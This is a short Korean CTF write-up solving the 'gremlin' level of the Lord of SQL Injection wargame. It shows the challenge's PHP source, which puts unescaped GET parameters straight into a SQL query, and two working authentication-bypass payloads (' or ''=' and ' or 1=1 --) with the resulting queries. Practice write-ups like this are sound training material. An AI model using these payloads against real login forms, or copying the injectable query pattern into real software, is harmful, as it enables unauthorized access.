# 1번 문제 gremlin

서버에서 sql문을 위같이 처리한다 했을때,
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
파라미터를 아래와 같이 입력하면 풀린다.
```
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=%27%20or%20%27%27=%27&pw=%27%20or%20%27%27=%27
query : select id from prob_gremlin where id='' or ''='' and pw='' or ''=''  
```
또한 주석(--)을 이용해서 입력해도 풀린다.
```
https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=%27%20or%201=1%20--%20
query : select id from prob_gremlin where id='' or 1=1 -- ' and pw=''
```
